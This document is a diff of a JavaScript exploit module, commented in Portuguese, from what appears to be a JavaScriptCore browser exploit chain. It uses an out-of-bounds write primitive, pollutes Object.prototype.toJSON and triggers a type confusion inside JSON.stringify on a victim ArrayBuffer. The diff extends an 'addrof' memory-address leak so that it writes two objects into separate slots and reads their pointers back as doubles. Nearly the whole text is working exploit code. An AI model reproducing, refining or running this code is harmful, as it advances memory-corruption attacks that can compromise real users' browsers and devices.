@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (Modificado para tentativa de addrof DIRETA com ajuste de índice)
+// js/script3/testArrayBufferVictimCrash.mjs (Modificado para testar múltiplos slots)
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
@@ -9,23 +9,19 @@ import {
 } from '../core_exploit.mjs';
 import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
-// Nome do módulo atualizado para refletir a tentativa de addrof
-export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v2_IndexAdjust"; // Mudança no nome para v2
+export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v3_MultiSlot";
 
 const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
-const VICTIM_AB_SIZE = 64; // Deve ser suficiente para float64_view_on_victim[0] e para this[2]
+const VICTIM_AB_SIZE = 64; // Suficiente para float64_view_on_victim[0] e [1]
 
-// Variáveis globais do script original
 let toJSON_call_details_v28 = null;
+let object_to_leak_A = null; // Para this[0]
+let object_to_leak_B = null; // Para this[1]
 
-// NOVA LÓGICA PARA ADDROF: Objeto cujo endereço queremos vazar.
-let object_to_leak_for_addrof_attempt = null;
-
-
-// toJSON Ultra-Minimalista, AGORA COM A TENTATIVA DE ESCRITA PARA ADDROF NO ÍNDICE CORRIGIDO
-function toJSON_V28_MinimalProbe_With_AddrofAttempt_Idx2() { // Nome da sonda atualizado
+// Sonda para escrever em múltiplos slots
+function toJSON_V28_Probe_MultiSlot() {
     toJSON_call_details_v28 = {
-        probe_variant: "V28_Probe_With_Addrof_Idx2", // Nome da sonda atualizado
+        probe_variant: "V28_Probe_MultiSlot",
         this_type_in_toJSON: "N/A_before_call",
         error_in_toJSON: null,
         probe_called: false
@@ -36,14 +32,19 @@ function toJSON_V28_MinimalProbe_With_AddrofAttempt_Idx2() { // Nome da sonda at
         toJSON_call_details_v28.this_type_in_toJSON = Object.prototype.toString.call(this);
         logS3(`[${toJSON_call_details_v28.probe_variant}] 'this' é o objeto vítima. Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "leak");
 
-        // MODIFICADO PARA ADDROF: Se a Heisenbug ocorrer...
         if (this === victim_ab_ref_for_original_test && toJSON_call_details_v28.this_type_in_toJSON === '[object Object]') {
-            logS3(`[${toJSON_call_details_v28.probe_variant}] HEISENBUG CONFIRMADA! Tentando escrever object_to_leak_for_addrof_attempt em this[2]...`, "vuln");
-            if (object_to_leak_for_addrof_attempt) {
-                this[2] = object_to_leak_for_addrof_attempt; // <<<< MUDANÇA CRUCIAL AQUI: this[0] para this[2]
-                logS3(`[${toJSON_call_details_v28.probe_variant}] Escrita de referência em this[2] (supostamente) realizada.`, "info");
+            logS3(`[${toJSON_call_details_v28.probe_variant}] HEISENBUG CONFIRMADA! Tentando escrever object_to_leak_A em this[0] e object_to_leak_B em this[1]...`, "vuln");
+            if (object_to_leak_A) {
+                this[0] = object_to_leak_A;
+                logS3(`[${toJSON_call_details_v28.probe_variant}] Escrita de object_to_leak_A em this[0] (supostamente) realizada.`, "info");
             } else {
-                logS3(`[${toJSON_call_details_v28.probe_variant}] object_to_leak_for_addrof_attempt é null. Escrita não tentada.`, "warn");
+                logS3(`[${toJSON_call_details_v28.probe_variant}] object_to_leak_A é null. Escrita em this[0] não tentada.`, "warn");
+            }
+            if (object_to_leak_B) {
+                this[1] = object_to_leak_B;
+                logS3(`[${toJSON_call_details_v28.probe_variant}] Escrita de object_to_leak_B em this[1] (supostamente) realizada.`, "info");
+            } else {
+                logS3(`[${toJSON_call_details_v28.probe_variant}] object_to_leak_B é null. Escrita em this[1] não tentada.`, "warn");
             }
         } else if (this === victim_ab_ref_for_original_test) {
             logS3(`[${toJSON_call_details_v28.probe_variant}] Heisenbug NÃO confirmada. Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "warn");
@@ -53,36 +54,33 @@ function toJSON_V28_MinimalProbe_With_AddrofAttempt_Idx2() { // Nome da sonda at
         toJSON_call_details_v28.error_in_toJSON = `${e.name}: ${e.message}`;
         logS3(`[${toJSON_call_details_v28.probe_variant}] ERRO na sonda: ${e.name} - ${e.message}`, "error");
     }
-    return { minimal_probe_executed: true }; // Retorno original
+    return { minimal_probe_executed: true };
 }
 
-// Variável para manter a referência ao victim_ab para a sonda
 let victim_ab_ref_for_original_test = null;
 
 export async function executeArrayBufferVictimCrashTest() {
     const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug Estável e Tentativa de Addrof com Índice Ajustado ---`, "test", FNAME_CURRENT_TEST);
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug e Tentativa de Addrof Multi-Slot ---`, "test", FNAME_CURRENT_TEST);
     document.title = `${FNAME_MODULE_V28} Inic...`;
 
     toJSON_call_details_v28 = null;
     victim_ab_ref_for_original_test = null;
-    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObjectForAddrof" };
+    object_to_leak_A = { marker: "ObjetoA_ParaLeituraEmVIEW0", id: Date.now() };
+    object_to_leak_B = { marker: "ObjetoB_ParaLeituraEmVIEW1", id: Date.now() + 123 }; // Objeto distinguível
 
     let errorCapturedMain = null;
     let stringifyOutput = null;
     
-    let addrof_result = {
-        success: false,
-        leaked_address_as_double: null,
-        leaked_address_as_int64: null,
-        message: "Addrof não tentado ou Heisenbug não ocorreu."
-    };
+    let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A @ view[0]: Não tentado ou Heisenbug falhou." };
+    let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B @ view[1]: Não tentado ou Heisenbug falhou." };
     
-    const corruptionTargetOffsetInOOBAB = 0x7C; // Mesmo offset de antes
+    const corruptionTargetOffsetInOOBAB = 0x7C;
+    const fillPattern = 0.123456789101112;
 
     try {
         await triggerOOB_primitive({ force_reinit: true });
-        if (!oob_array_buffer_real && typeof oob_write_absolute !== 'function') { // Checagem mais robusta
+         if (!oob_array_buffer_real && typeof oob_write_absolute !== 'function') {
              throw new Error("OOB Init falhou ou oob_write_absolute não está disponível.");
         }
         logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
@@ -96,10 +94,9 @@ export async function executeArrayBufferVictimCrashTest() {
 
         victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
         let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
-        const fillPattern = 0.123456789101112; // Padrão de preenchimento
         float64_view_on_victim.fill(fillPattern);
 
-        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_on_victim[0]}. Tentando JSON.stringify com ${toJSON_V28_MinimalProbe_With_AddrofAttempt_Idx2.name}...`, "test", FNAME_CURRENT_TEST);
+        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_on_victim[0]}. Tentando JSON.stringify com ${toJSON_V28_Probe_MultiSlot.name}...`, "test", FNAME_CURRENT_TEST);
         
         const ppKey = 'toJSON';
         let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
@@ -107,51 +104,67 @@ export async function executeArrayBufferVictimCrashTest() {
 
         try {
             Object.defineProperty(Object.prototype, ppKey, {
-                value: toJSON_V28_MinimalProbe_With_AddrofAttempt_Idx2, // Usar a sonda ATUALIZADA
+                value: toJSON_V28_Probe_MultiSlot,
                 writable: true, configurable: true, enumerable: false
             });
             pollutionApplied = true;
-            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V28_MinimalProbe_With_AddrofAttempt_Idx2.name}.`, "info", FNAME_CURRENT_TEST);
+            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V28_Probe_MultiSlot.name}.`, "info", FNAME_CURRENT_TEST);
 
-            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)... (Ponto esperado da Heisenbug e escrita para addrof em this[2])`, "warn", FNAME_CURRENT_TEST);
+            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)... (Ponto esperado da Heisenbug e escritas em this[0], this[1])`, "warn", FNAME_CURRENT_TEST);
             stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test); 
             
             logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Resultado (da sonda): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
             logS3(`  Detalhes da sonda (toJSON_call_details_v28): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
 
             if (toJSON_call_details_v28 && toJSON_call_details_v28.probe_called && toJSON_call_details_v28.this_type_in_toJSON === "[object Object]") {
-                logS3(`  HEISENBUG CONFIRMADA (fora da sonda, via toJSON_call_details_v28)! Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
+                logS3(`  HEISENBUG CONFIRMADA (via toJSON_call_details_v28)! Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
                 
-                logS3("PASSO 3: Verificando float64_view_on_victim[0] APÓS Heisenbug e tentativa de escrita (em this[2]) na sonda...", "warn", FNAME_CURRENT_TEST);
-                const value_read_as_double = float64_view_on_victim[0]; // AINDA LEMOS DE [0] DA VIEW
-                addrof_result.leaked_address_as_double = value_read_as_double;
-                logS3(`  Valor lido de float64_view_on_victim[0]: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST);
+                logS3("PASSO 3: Verificando float64_view_on_victim APÓS Heisenbug e tentativas de escrita na sonda...", "warn", FNAME_CURRENT_TEST);
 
-                const double_buffer_for_conversion = new ArrayBuffer(8);
-                const double_view_for_conversion = new Float64Array(double_buffer_for_conversion);
-                const int32_view_for_double_conversion = new Uint32Array(double_buffer_for_conversion);
-                double_view_for_conversion[0] = value_read_as_double;
-                addrof_result.leaked_address_as_int64 = new AdvancedInt64(int32_view_for_double_conversion[0], int32_view_for_double_conversion[1]);
-                logS3(`  Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
+                // Checar Objeto A em view[0]
+                const val_A_double = float64_view_on_victim[0];
+                addrof_result_A.leaked_address_as_double = val_A_double;
+                let temp_buf_A = new ArrayBuffer(8); new Float64Array(temp_buf_A)[0] = val_A_double;
+                addrof_result_A.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_A)[0], new Uint32Array(temp_buf_A)[1]);
+                logS3(`  Valor lido de float64_view_on_victim[0] (para ObjA): ${val_A_double} (${addrof_result_A.leaked_address_as_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);
 
-                // A mesma lógica de verificação de ponteiro
-                if (value_read_as_double !== 0 && value_read_as_double !== fillPattern &&
-                    (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
-                    logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST);
-                    addrof_result.success = true;
-                    addrof_result.message = "Heisenbug confirmada E leitura de double (de this[2]) sugere um ponteiro.";
-                    document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
+                if (val_A_double !== 0 && val_A_double !== fillPattern &&
+                    (addrof_result_A.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_A.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
+                    logS3("  !!!! VALOR LIDO em view[0] PARECE UM PONTEIRO POTENCIAL (ObjA) !!!!", "vuln", FNAME_CURRENT_TEST);
+                    addrof_result_A.success = true;
+                    addrof_result_A.message = "Heisenbug confirmada E leitura de view[0] sugere um ponteiro para ObjA.";
                 } else {
-                    addrof_result.message = "Heisenbug confirmada, mas valor lido de float64_view_on_victim[0] (esperado de this[2]) não parece ponteiro ou buffer não foi alterado.";
-                    logS3(`  INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double})`, "warn", FNAME_CURRENT_TEST);
-                    document.title = `${FNAME_MODULE_V28}: Heisenbug OK, Addr Falhou`;
+                    addrof_result_A.message = "Heisenbug confirmada, mas valor lido de view[0] não parece ponteiro para ObjA ou buffer não foi alterado.";
                 }
+
+                // Checar Objeto B em view[1]
+                const val_B_double = float64_view_on_victim[1];
+                addrof_result_B.leaked_address_as_double = val_B_double;
+                let temp_buf_B = new ArrayBuffer(8); new Float64Array(temp_buf_B)[0] = val_B_double;
+                addrof_result_B.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_B)[0], new Uint32Array(temp_buf_B)[1]);
+                logS3(`  Valor lido de float64_view_on_victim[1] (para ObjB): ${val_B_double} (${addrof_result_B.leaked_address_as_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);
+                
+                if (val_B_double !== 0 && val_B_double !== fillPattern &&
+                    (addrof_result_B.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_B.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
+                    logS3("  !!!! VALOR LIDO em view[1] PARECE UM PONTEIRO POTENCIAL (ObjB) !!!!", "vuln", FNAME_CURRENT_TEST);
+                    addrof_result_B.success = true;
+                    addrof_result_B.message = "Heisenbug confirmada E leitura de view[1] sugere um ponteiro para ObjB.";
+                } else {
+                    addrof_result_B.message = "Heisenbug confirmada, mas valor lido de view[1] não parece ponteiro para ObjB ou buffer não foi alterado.";
+                }
+
+                if (addrof_result_A.success || addrof_result_B.success) {
+                    document.title = `${FNAME_MODULE_V28}: Addr? SUCESSO PARCIAL/TOTAL!`;
+                } else {
+                     document.title = `${FNAME_MODULE_V28}: Heisenbug OK, Addr Falhou`;
+                }
+
             } else {
                 let msg = "Heisenbug (this como [object Object]) não foi confirmada via toJSON_call_details_v28.";
                 if(toJSON_call_details_v28 && toJSON_call_details_v28.this_type_in_toJSON) msg += ` Tipo obs: ${toJSON_call_details_v28.this_type_in_toJSON}`;
                 else if (!toJSON_call_details_v28) msg += " toJSON_call_details_v28 é null.";
-                addrof_result.message = msg;
-                logS3(`  ALERTA: ${addrof_result.message}`, "error", FNAME_CURRENT_TEST);
+                addrof_result_A.message = msg; addrof_result_B.message = msg;
+                logS3(`  ALERTA: ${msg}`, "error", FNAME_CURRENT_TEST);
                 document.title = `${FNAME_MODULE_V28}: Heisenbug Falhou`;
             }
 
@@ -159,7 +172,8 @@ export async function executeArrayBufferVictimCrashTest() {
             errorCapturedMain = e_str;
             logS3(`    ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
             document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`;
-            addrof_result.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
+            addrof_result_A.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
+            addrof_result_B.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
         } finally {
             if (pollutionApplied) {
                 if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
@@ -172,22 +186,29 @@ export async function executeArrayBufferVictimCrashTest() {
         logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
         if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
         document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`;
-        addrof_result.message = `Erro geral no teste: ${e_outer_main.name}`;
+        addrof_result_A.message = `Erro geral no teste: ${e_outer_main.name}`;
+        addrof_result_B.message = `Erro geral no teste: ${e_outer_main.name}`;
     } finally {
-        clearOOBEnvironment(); // Limpar o ambiente OOB ao final do teste
+        clearOOBEnvironment();
         logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
-        logS3(`Resultado Addrof: Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
-        if(addrof_result.leaked_address_as_int64){
-            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
+        logS3(`Resultado Addrof A (view[0]): Success=${addrof_result_A.success}, Msg='${addrof_result_A.message}'`, addrof_result_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
+        if(addrof_result_A.leaked_address_as_int64){
+            logS3(`  Addrof A (Int64): ${addrof_result_A.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
         }
-        object_to_leak_for_addrof_attempt = null;
+        logS3(`Resultado Addrof B (view[1]): Success=${addrof_result_B.success}, Msg='${addrof_result_B.message}'`, addrof_result_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
+        if(addrof_result_B.leaked_address_as_int64){
+            logS3(`  Addrof B (Int64): ${addrof_result_B.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
+        }
+        object_to_leak_A = null;
+        object_to_leak_B = null;
         victim_ab_ref_for_original_test = null;
     }
     return { 
         errorOccurred: errorCapturedMain, 
-        potentiallyCrashed: false, 
+        potentiallyCrashed: false, // Se chegamos aqui, não crashou silenciosamente.
         stringifyResult: stringifyOutput, 
         toJSON_details: toJSON_call_details_v28,
-        addrof_attempt_result: addrof_result 
+        addrof_A_attempt_result: addrof_result_A, // Retornar ambos os resultados
+        addrof_B_attempt_result: addrof_result_B
     };
 }
